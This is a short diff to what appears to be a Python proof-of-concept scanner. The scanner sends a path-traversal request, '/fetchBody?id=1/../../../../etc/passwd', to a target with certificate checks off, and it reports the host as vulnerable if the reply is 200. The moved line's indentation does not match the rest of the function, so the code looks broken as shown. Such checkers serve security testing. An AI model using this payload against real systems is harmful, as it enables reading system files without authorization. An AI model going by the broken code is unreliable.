@@ -30,8 +30,8 @@ def banner():
 
 
 def poc(target):
+      url = target + "/fetchBody?id=1/../../../../../../../../etc/passwd"
     try:
-        url = target + "/fetchBody?id=1/../../../../../../../../etc/passwd"
         res = requests.get(url, headers=headers, verify=False, timeout=5)
         if res.status_code == 200:
             result = "[+]{} is vulnerable".format(target)
